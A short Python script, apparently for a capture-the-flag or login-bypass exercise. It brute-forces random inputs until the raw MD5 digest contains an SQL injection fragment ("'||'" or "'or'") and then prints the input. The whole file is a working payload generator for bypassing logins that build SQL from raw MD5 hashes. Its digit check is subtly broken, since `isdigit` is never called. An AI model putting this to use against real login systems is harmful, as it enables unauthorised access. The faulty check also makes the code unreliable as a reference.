import random
from hashlib import md5

needle0 = "\'||\'"
needle1 = "\'or\'"
i = 0

while 1:
    i+= 1

    if i % 100000 == 0:
        print(i)

    pass_hash = md5()
    rand = str(random.randint(1,123456789012345678901234567890))

    pass_hash.update(rand)

    string = pass_hash.digest()

    idx = string.find(needle0)
    if idx < 0:
        idx = string.find(needle1)

    if idx > 0:
        if string[idx + 4].isdigit:
            print("Count: " + str(i))
            print("Input: " + rand)
            print("Output: "+ string)
            break
